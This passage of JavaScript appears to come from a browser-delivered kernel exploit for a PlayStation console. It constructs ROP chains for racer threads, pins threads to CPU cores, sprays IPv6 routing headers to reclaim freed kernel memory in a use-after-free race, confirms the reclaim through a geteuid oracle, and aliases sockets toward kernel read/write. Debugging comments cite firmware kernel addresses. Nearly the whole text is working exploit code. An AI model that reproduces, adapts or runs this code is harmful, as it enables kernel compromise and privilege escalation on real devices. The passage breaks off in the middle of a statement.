                    //   one 0 among 1s  -> that worker was starved / never scheduled
                    //   all 0s          -> the WAKE never reached anyone (signal lost)
                    const t0 = Date.now();
                    const deadline = t0 + 5000;
                    let wakeIters = 0;
                    while (true) {
                        syscall(SYSCALL.umtx_op, this.cmd, UMTX_OP_WAKE,
                            0x7FFFFFFFn, 0n, 0n);
                        wakeIters++;
                        let all_awake = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64(this.awake + BigInt(i * 8)) === 0n) {
                                all_awake = false; stuck = i; break;
                            }
                        }
                        if (all_awake) break;
                        if (Date.now() > deadline) {
                            let aVec = [], fVec = [];
                            for (let k = 0; k < n; k++) {
                                aVec.push(read64(this.awake + BigInt(k * 8)) === 0n ? 0 : 1);
                                fVec.push(read64(this.finished + BigInt(k * 8)) === 0n ? 0 : 1);
                            }
                            try {
                                window.syncMark("WSYNC-WAKE-TIMEOUT",
                                    "group=" + this.label + " n=" + n + " firstStuck=" + stuck
                                    + " awake=[" + aVec.join(",") + "]"
                                    + " finished=[" + fVec.join(",") + "]"
                                    + " gen=" + this.gen
                                    + " wakeIters=" + wakeIters
                                    + " elapsedMs=" + (Date.now() - t0)
                                    + " allPinnedTo=core" + MAIN_CORE
                                    + " rtprio=" + MAIN_RTPRIO
                                    + " (one 0 among 1s = that worker starved;"
                                    + " all 0 = WAKE never delivered)");
                            } catch (e) { }
                            fail("worker_sync.signal: WAKE timeout - group " + this.label
                                + " worker " + stuck + "/" + n
                                + " never reached WAIT exit (awake=[" + aVec.join(",") + "])");
                        }
                        syscall(SYSCALL.sched_yield);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64(this.finished + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline) {
                            let fVec = [];
                            for (let k = 0; k < n; k++)
                                fVec.push(read64(this.finished + BigInt(k * 8)) === 0n ? 0 : 1);
                            try {
                                window.syncMark("WSYNC-WAIT-TIMEOUT",
                                    "group=" + this.label + " n=" + n + " firstStuck=" + stuck
                                    + " finished=[" + fVec.join(",") + "]"
                                    + " gen=" + this.gen
                                    + " allPinnedTo=core" + MAIN_CORE
                                    + " rtprio=" + MAIN_RTPRIO);
                            } catch (e) { }
                            fail("worker_sync.wait: timeout - group " + this.label
                                + " worker " + stuck + "/" + n
                                + " stalled (finished=[" + fVec.join(",") + "])");
                        }
                        syscall(SYSCALL.sched_yield);
                    }
                },
                terminate() {

                    for (let i = 0; i < n; i++) {
                        write64(this.pivot_slots[i], this.exit_addrs[i]);
                    }
                    this.signal();
                    this.wait();
                },
            };
            return ws;
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            // Match poopsploit's proven discipline (its rop.js: stack_size 0x80000,
            // reserved_stack 0x10000). Racer chains CALL into libkernel, and anything they
            // call pushes DOWNWARD from `entry` into the reserve - rsp starts at `entry`
            // and climbs as the chain pops, so the deepest push is at the first call.
            // 0x4000 was 4x tighter than the substrate's known-good value, and cramped
            // racer stacks are exactly what wedged the earlier lapse port. Grow the region
            // too, so chain space ABOVE entry grows rather than shrinks.
            const STACK_SIZE = 0x40000;
            const RESERVED = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < BigInt(RESERVED); k += 8n) write64(buf + k, 0n);
            const entry = buf + BigInt(RESERVED);

            const cmd_addr = ws.cmd;
            const awake_addr = ws.awake + BigInt(wid * 8);
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(ROP.ret);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(ROP.pop_rdi); emit(3n);
            emit(ROP.pop_rsi); emit(1n);
            emit(ROP.pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(ROP.pop_rcx); emit(0x10n);
            emit(ROP.pop_r8); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);

            emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
            emit(ROP.pop_rdi); emit(1n);
            emit(ROP.pop_rsi); emit(0n);
            emit(ROP.pop_rdx); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const LOOP_START = idx;

            const waitBase = idx;
            emit(ROP.pop_rax); emit(SYSCALL.umtx_op);
            emit(ROP.pop_rdi); emit(cmd_addr);
            emit(ROP.pop_rsi); emit(UMTX_OP_WAIT);
            emit(ROP.pop_rdx); emit(0n);
            emit(ROP.pop_rcx); emit(0n);
            emit(ROP.pop_r8); emit(0n);
            emit(syscall_wrapper);
            emit(ROP.ret);
            const wait_val_slot = at(waitBase + 7);

            const awakeBase = idx;
            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(awake_addr);
            emit(ROP.mov_qword_rdi_rax);
            emit(ROP.ret);

            const workBase = idx;
            emit(ROP.pop_rax); emit(sysnum);
            emit(ROP.pop_rdi); emit(BigInt(fd));
            emit(ROP.pop_rsi); emit(iov_ptr);
            emit(ROP.pop_rdx); emit(count_arg);
            emit(syscall_wrapper);
            emit(ROP.ret);

            const repairSlot = (slotIdx, value) => {
                emit(ROP.pop_rdi); emit(at(slotIdx));
                emit(ROP.pop_rax); emit(value);
                emit(ROP.mov_qword_rdi_rax);
            };
            repairSlot(waitBase + 0, ROP.pop_rax);
            repairSlot(waitBase + 1, SYSCALL.umtx_op);
            repairSlot(waitBase + 2, ROP.pop_rdi);
            repairSlot(waitBase + 3, cmd_addr);
            repairSlot(waitBase + 4, ROP.pop_rsi);
            repairSlot(waitBase + 5, UMTX_OP_WAIT);
            repairSlot(waitBase + 6, ROP.pop_rdx);

            repairSlot(waitBase + 8, ROP.pop_rcx);
            repairSlot(waitBase + 9, 0n);
            repairSlot(waitBase + 10, ROP.pop_r8);
            repairSlot(waitBase + 11, 0n);
            repairSlot(waitBase + 12, syscall_wrapper);
            repairSlot(awakeBase + 0, ROP.pop_rax);
            repairSlot(awakeBase + 1, 1n);
            repairSlot(awakeBase + 2, ROP.pop_rdi);
            repairSlot(awakeBase + 3, awake_addr);
            repairSlot(awakeBase + 4, ROP.mov_qword_rdi_rax);
            repairSlot(workBase + 0, ROP.pop_rax);
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, ROP.pop_rdi);
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, ROP.pop_rsi);
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, ROP.pop_rdx);
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(ROP.pop_rax); emit(1n);
            emit(ROP.pop_rdi); emit(finished_addr);
            emit(ROP.mov_qword_rdi_rax);

            emit(ROP.pop_rsp);
            const pivotSlotIdx = idx;
            emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(ROP.ret);
            const EXIT_START = idx;
            emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
            emit(ROP.pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return {
                entry,
                wait_val_slot,
                pivotAddr: at(pivotSlotIdx),
                exitAddr: at(EXIT_START),
            };
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: kernel_offset,
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8(S.cpu_mask + BigInt(i), 0n);
            write16(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16(S.rt_params, PRI_REALTIME);
            write16(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            // VERIFY the pin: p2jb assumed cores 0-4 exist for this process, but the
            // WebProcess is restricted to a Sony-chosen CPU subset, so these calls were
            // failing SILENTLY (EINVAL) and nothing was ever pinned. Beacon the returns.
            const r1 = syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            const r2 = syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
            window.syncMark("PIN-EXEC", "core=" + MAIN_CORE + " affret=" + toHex(r1) + " rtret=" + toHex(r2));
        }

        function get_current_core() {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
            let num = Number(read32(mask));
            let position = 0;
            while (num > 0) { num = num >>> 1; position += 1; }
            return position - 1;
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
            write16(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32(sv1));
            S.iov_sock_b = Number(read32(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32(sv2));
            S.uio_sock_b = Number(read32(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64(S.recvmsg_iovecs, 1n);
            write64(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64(S.recvmsg_hdr + BigInt(i), 0n);
            write64(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_read + BigInt(i), 0n);
            }
            write64(S.uio_iov_read, S.uio_read_buf);
            write64(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64(S.uio_iov_write + BigInt(i), 0n);
            }
            write64(S.uio_iov_write, S.uio_write_buf);
            write64(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        async function setup_workers(S) {
            window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
            window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
                + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM, "iov");
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM, "uio_read");
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM, "uio_write");

            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
                S.iov_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
                if (i === 0) { await js_sleep(500); window.syncMark("IOV-0-ALIVE", "main survived 500ms after first racer spawn"); }
            }
            window.syncMark("SETUP-WORKERS-DONE", "all racers spawned");
            window.liveStatus("SETUP - racer threads up. building leak chains...");
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);

            // EARLY DEAD-SOCKET SWEEP. A socket that fails set_rthdr (EBADF) reads back as
            // ZEROS forever, and every consumer then miscounts it:
            //   - find_twins scores it as a "foreign" tag every round (observed:
            //     mism=560 foreign=560 over 56 attempts = exactly 10/attempt = one dead
            //     socket x MAX_ROUNDS_TWIN - i.e. ALL apparent reclaim activity was fake)
            //   - the burn's header detector reads 0x0 != baseline and fires CHUNK-HIT on
            //     the very first close (v64 died exactly this way on sock[9])
            // _deadSock was only ever populated inside attempt_race, far too late for the
            // burn. Sweep once here, at setup, so every later consumer sees a clean set.
            S._deadSock = S._deadSock || {};
            let dead = [];
            for (let i = 0; i < S.ipv6_count; i++) {
                const r = toBigSafe(rthdr_set(S, i));
                if ((r & 0xFFFFFFFFn) !== 0n) {
                    S._deadSock[i] = 1;
                    dead.push(i + ":fd" + S.ipv6_sockets[i] + ":r=" + toHex(r));
                }
            }
            window.syncMark("SOCK-SWEEP", dead.length
                ? ("DEAD " + dead.length + "/" + S.ipv6_count + " -> " + dead.slice(0, 8).join(" ")
                   + "  (excluded from spray, twins and burn detector)")
                : ("all " + S.ipv6_count + " sockets healthy"));
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }
        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
        function rthdr_get_tag(S, idx) {
            write32(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32(S.tag_buf + 4n));
        }

        // BATCHED find_twins. The original issued one fireSync syscall per socket:
        // ~65ms per spray round AND the worker could park/migrate cores between calls,
        // so a chunk freed into one core's per-CPU UMA bucket was sprayed from another
        // core and never reclaimed -> twins never formed (96/96 attempts lost).
        // Now the whole tag+spray round is ONE worker wake (~1ms, single core), which is
        // how poopsploit wins the same iov/uio-UAF reclaim on this firmware.
        function twin_bufs(S) {
            if (S._tw) return S._tw;
            const bufs = [], lens = [];
            for (let i = 0; i < S.ipv6_count; i++) {
                const b = malloc(16), l = malloc(4);
                write64(b, 0n); write32(l, 8n);
                bufs.push(b); lens.push(l);
            }
            S._tw = { bufs, lens };
            return S._tw;
        }
        // set_rthdr/syscall may hand back a BigInt or a plain number depending on path;
        // normalise before doing BigInt arithmetic on it.
        function toBigSafe(x) { return (typeof x === 'bigint') ? x : BigInt(x || 0); }
        // Shared spray-item builder: [storeAddr, storeVal, arg1] triples for
        // syscallBatchTagged. Used by both the calibrated burn and find_twins, so the
        // burn's reclaim attempt is byte-identical to the one twin detection relies on.
        function spray_items_for(S) {
            if (S._sprayItems) return S._sprayItems;
            // HARD CLAMP. A tagged-spray item costs ~18 chain slots (store = pop rax +
            // pop rdi + mov, then 5 arg pops, pop rax, call). BATCH_CAP is 0x8000 = 4096
            // slots, so ~225 items is the ceiling; 256 built a 37088-byte chain and
            // rop-worker threw mid-burn, losing a 50-minute run. Clamp instead of trusting
            // the constant, so raising NUM_IPV6_SOCKETS can never blow the chain again.
            // WRAP_SLOTS also has to cover the LEAD call the burn now fuses in front of
            // the spray (leadThenBatchTagged: 5 arg pops + pop rax + call). Measured
            // 145.3 B/item, so 225 items = 32700 B and the lead pushed the ceiling to
            // ~32748 vs a 32768 cap - 20 bytes of margin. Not hit today (ipv6_count=192),
            // but the clamp exists precisely so a future NUM_IPV6_SOCKETS bump cannot
            // blow the chain again.
            const SLOTS_PER_ITEM = 18, WRAP_SLOTS = 32 + 16;
            const MAX_ITEMS = Math.floor((32768 / 8 - WRAP_SLOTS) / SLOTS_PER_ITEM);
            const items = [];
            // skip sockets SPRAY-CHECK proved dead (EBADF) - a stale fd returns zeros on
            // readback and was being miscounted as reclaim activity for 96 attempts
            for (let i = 0; i < S.ipv6_count; i++)
                // S._poisoned is undefined until stage1, so this is a no-op for the stage0
                // race and a safety net for any later caller: that socket's rthdr aliases
                // a live kqueue and spraying it does free(kqueue, M_IP6OPT).
                if (S._deadSock && S._deadSock[i]) continue;
                else if (S._poisoned !== undefined && i === S._poisoned) continue;
                else
                items.push([S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i),
                    BigInt(S.ipv6_sockets[i])]);
            if (items.length > MAX_ITEMS) {
                window.syncMark("SPRAY-CLAMP", "items " + items.length + " -> " + MAX_ITEMS
                    + " (chain cap); raise BATCH_CAP or chunk if more pressure is needed");
                items.length = MAX_ITEMS;
            }
            S._sprayItems = items;
            return items;
        }
        // Render the find_twins census. Kept separate so both RACE-TALLY and RACE-FINAL
        // print the identical shape and a log diff between runs is meaningful.
        function census_str(S) {
            const C = S._census;
            if (!C || !C.examined) return "no readbacks examined";
            const ols = Object.keys(C.optlen).sort(function (a, b) {
                return C.optlen[b] - C.optlen[a];
            }).slice(0, 4).map(function (k) { return k + "x" + C.optlen[k]; }).join(",");
            return "examined=" + C.examined
                + " untouched=" + C.untouched
                + " tagAbsent=" + C.tagAbsent
                + " outOfRange=" + C.outOfRange
                + " selfTagged=" + C.selfTagged
                + " optlen=" + ols;
        }

        async function find_twins(S, max_rounds) {
            const { bufs, lens } = twin_bufs(S);
            // [storeAddr, storeVal, arg1] -> store tag into the shared spray buf, then
            // setsockopt(sock_i, IPPROTO_IPV6, IPV6_RTHDR, spray, len). Every call sees
            // the buffer as of chain-execution time, which is why the store must be in-chain.
            const spray_items = [];
            for (let i = 0; i < S.ipv6_count; i++)
                spray_items.push([S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i),
                    BigInt(S.ipv6_sockets[i])]);
            const read_calls = [];
            for (let i = 0; i < S.ipv6_count; i++)
                read_calls.push([Number(SYSCALL.getsockopt), BigInt(S.ipv6_sockets[i]),
                    IPPROTO_IPV6, IPV6_RTHDR, bufs[i], lens[i]]);

            // One-shot per-socket spray VERIFICATION. The batched spray discards return
            // values, so a socket whose setsockopt fails is invisible - that is how
            // sock=9 sat there returning zeros for 96 attempts while being counted as
            // "foreign" reclaim activity. Check each socket individually once.
            if (!S._sprayChecked) {
                S._sprayChecked = 1;
                let bad = [];
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    const r = set_rthdr(S.ipv6_sockets[i], S.rthdr_spray, S.rthdr_spray_len);
                    if ((toBigSafe(r) & 0xFFFFFFFFn) !== 0n) {
                        bad.push(i + ":fd" + S.ipv6_sockets[i] + ":r=" + toHex(r));
                        (S._deadSock = S._deadSock || {})[i] = 1;
                    }
                }
                window.syncMark("SPRAY-CHECK", bad.length
                    ? ("FAILING " + bad.length + "/" + S.ipv6_count + " -> " + bad.slice(0, 6).join(" "))
                    : ("all " + S.ipv6_count + " sockets accept IPV6_RTHDR"));
            }
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                // NB: batch chains write raw values into the ROP chain, so every arg must
                // already be BigInt (the per-call path coerced; this one does not).
                // build_rthdr returns a Number -> coerce the length explicitly.
                window.syscallBatchTagged(spray_items, Number(SYSCALL.setsockopt),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_spray, BigInt(S.rthdr_spray_len));
                // UID ORACLE. UCRED_CR_UID is at ucred+0x04 and our tag is written at
                // spray+0x04 - the alignment is deliberate. So if a freed ucred was
                // reclaimed by one of our 360-byte rthdr sprays, cr_uid IS our tag and
                // GETEUID - not getuid - returns 0x1337xxxx. Disassembled on 12.00 and
                // 12.70: sys_geteuid reads [ucred+4] (cr_uid), sys_getuid reads [ucred+8]
                // (cr_ruid). This site used getuid(), so it could never match the tag.
                // This proves the premature free + reclaim with ONE syscall, and unlike
                // find_twins it needs only a SINGLE free (twins additionally require a
                // double free to alias two sockets). Cleanly separates "free never
                // happened" from "free happened, no alias".
                try {
                    const uid = Number(syscall(SYSCALL.geteuid) & 0xFFFFFFFFn);
                    if ((uid & 0xFFFF0000) === RTHDR_TAG) {
                        if (!S._uidHit) {
                            S._uidHit = 1;
                            window.syncMark("UID-ORACLE", "RECLAIM CONFIRMED uid=0x"
                                + (uid >>> 0).toString(16) + " sock=" + (uid & 0xFFFF)
                                + " round=" + round_);
                        }
                    } else if (!S._uidSeen) {
                        S._uidSeen = 1;
                        window.syncMark("UID-ORACLE", "baseline uid=0x" + (uid >>> 0).toString(16));
                    }
                } catch (e) { }
                for (let i = 0; i < S.ipv6_count; i++) write32(lens[i], 8n);
                window.syscallBatch(read_calls);
                for (let i = 0; i < S.ipv6_count; i++) {
                    // Skip sockets the setup sweep marked dead. An EBADF socket reads back
                    // as ZEROS every round and was being scored as a "foreign" tag:
                    // observed mism=640 foreign=640 over 64 attempts = exactly 10/attempt
                    // = one dead socket x MAX_ROUNDS_TWIN. ALL apparent reclaim activity in
                    // every run to date was this one socket, not the exploit.
                    if (S._deadSock && S._deadSock[i]) continue;
                    const v = Number(read32(bufs[i] + 4n));
                    const j = v & 0xFFFF;
                    // CENSUS (ported from poops scanBatch, poops.js:1840). A scalar
                    // "twins=96" cannot tell a broken spray from a working spray that
                    // simply never saw a reclaim - v73 cost a REBOOT to disambiguate.
                    // Bucket every readback so a miss says WHICH of the ways it missed.
                    // NB: syscallBatch discards per-call return values, so sprayFail /
                    // readFail are NOT directly observable here; SPRAY-CHECK covers the
                    // persistent case and the optlen histogram covers the rest. Do not
                    // invent buckets we cannot actually measure.
                    const C = S._census || (S._census = {
                        untouched: 0, tagAbsent: 0, outOfRange: 0,
                        selfTagged: 0, optlen: {}, examined: 0
                    });
                    C.examined++;
                    const ol = Number(read32(lens[i]));
                    C.optlen[ol] = (C.optlen[ol] || 0) + 1;
                    if (v === (RTHDR_TAG + i)) C.untouched++;
                    else if ((v & 0xFFFF0000) !== RTHDR_TAG) C.tagAbsent++;
                    else if (j >= S.ipv6_count) C.outOfRange++;
                    else if (j === i) C.selfTagged++;
                    // Discriminator: did the readback differ from what we wrote at all?
                    // mismatch>0 but twins==0 => the spray IS reaching foreign memory but
                    // not aliasing two sockets. mismatch==0 for every attempt => the freed
                    // chunk is never reused by the spray (double free never landed), which
                    // points at the overflow/free accounting, not at the spray timing.
                    if (v !== (RTHDR_TAG + i)) {
                        S._mismatch = (S._mismatch || 0) + 1;
                        if ((v & 0xFFFF0000) !== RTHDR_TAG) S._foreign = (S._foreign || 0) + 1;
                        // WHICH socket and WHAT value. 96 attempts gave exactly 10
                        // mismatches each with zero variance; without the index+value we
                        // cannot tell "one socket's setsockopt failed" (mundane) from
                        // "this socket holds a dangling rthdr reading freed memory" (the
                        // UAF actually working). Log the first few per run, sync so a
                        // later hang cannot swallow them.
                        if ((S._mmLogged = (S._mmLogged || 0) + 1) <= 12)
                            window.syncMark("MM", "sock=" + i + " round=" + round_
                                + " got=0x" + (v >>> 0).toString(16)
                                + " want=0x" + ((RTHDR_TAG + i) >>> 0).toString(16)
                                + " len=" + read32(lens[i]));
                    }
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count)
                        return [i, j];
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        // extra_skip: additional socket indices that must NOT be sprayed.
        // WHY THIS EXISTS (RE'd, not guessed):
        //   stage1 starts with rthdr_free_idx(S, S.triplets[1]) and then spins kqueue()
        //   until a fresh kqueue lands in THAT freed chunk. So after stage1, the socket
        //   old-triplets[1] has ip6po_rthdr pointing at a LIVE KQUEUE.
        //   Setting any IPv6 option FREES the previous buffer - confirmed in the 12.00
        //   kernel at 0xFFFFFFFF808D9618:
        //       mov rdi,[rbx+0x18] ; test rdi,rdi ; je skip
        //       lea rsi,[rip+..]   ; = M_IP6OPT @0xFFFFFFFF82479BF0
        //       call 0xFFFFFFFF80E9FF20   ; free(ptr, M_IP6OPT)
        //       mov [rbx+0x18], 0
        //   (0x80E9FC80 is malloc - the adjacent malloc(0xd0, M_IP6OPT, M_WAITOK) confirms
        //    the pair.)  So the repair spray was calling free() on a live kqueue with the
        //   WRONG malloc type: a UMA free of in-use memory. That is one mechanism for BOTH
        //   observed failures - the no-output kernel panics (v73, v83) AND the indefinite
        //   wedges (v85, v86, both frozen on the FIRST repair round with no beacon).
        function find_triplet(S, master_idx, exclude_idx, max_rounds, extra_skip) {
            // Same batching fix as find_twins, and this one matters even more: the original
            // did ~62 per-socket fireSync round trips PER ROUND for up to 500 rounds (about
            // 31k worker wakes per call, twice per attempt). Now the whole spray is ONE
            // wake -> same core, ~1ms, so the reclaim can actually land in the freed chunk.
            const skipExtra = Array.isArray(extra_skip) ? extra_skip
                : (extra_skip === undefined || extra_skip === null ? [] : [extra_skip]);
            if (skipExtra.length)
                window.syncMark("TRIPLET", "skipping extra sockets [" + skipExtra.join(",")
                    + "] - their rthdr aliases the live kqueue; spraying them would"
                    + " free(kqueue, M_IP6OPT)");
            const items = [];
            for (let i = 0; i < S.ipv6_count; i++)
                if (i !== master_idx && i !== exclude_idx && skipExtra.indexOf(i) < 0)
                    items.push([S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i),
                        BigInt(S.ipv6_sockets[i])]);
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                // WHICH CALL BLOCKS. stage1's repair wedged 2/2 runs (v85, v86) right here:
                // process alive, UART alive, no crash, and with a per-2000-round beacon
                // NOTHING printed - so it is not a slow search, it is ONE call that never
                // returns. Most likely the spray touching the socket that now aliases the
                // kqueue we deliberately reclaimed the freed chunk with in stage1. Bracket
                // the two candidates so the next run names the blocker instead of guessing.
                if (round_ <= 3)
                    window.syncMark("TRIPLET", "round " + round_ + " -> SPRAY " + items.length
                        + " items (master=" + master_idx + " exclude=" + exclude_idx + ")");
                window.syscallBatchTagged(items, Number(SYSCALL.setsockopt),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_spray, BigInt(S.rthdr_spray_len));
                if (round_ <= 3)
                    window.syncMark("TRIPLET", "round " + round_ + " -> spray ok, READ tag"
                        + " from master=" + master_idx);
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
                // PROGRESS. find_triplet is the only long loop in the whole chain that
                // reported NOTHING, and stage1's repair call passes max_rounds=50000 -
                // ~190 sprays + 1 read per round = up to ~9.5M syscalls. When it goes deep
                // the log simply stops for 20+ minutes and is indistinguishable from a
                // wedge (v85: last beacon "stage1: proc_filedesc=..." then silence, process
                // alive, no crash - I spent 20 minutes proving it was not dead).
                if (round_ <= 3 || round_ % 200 === 0)
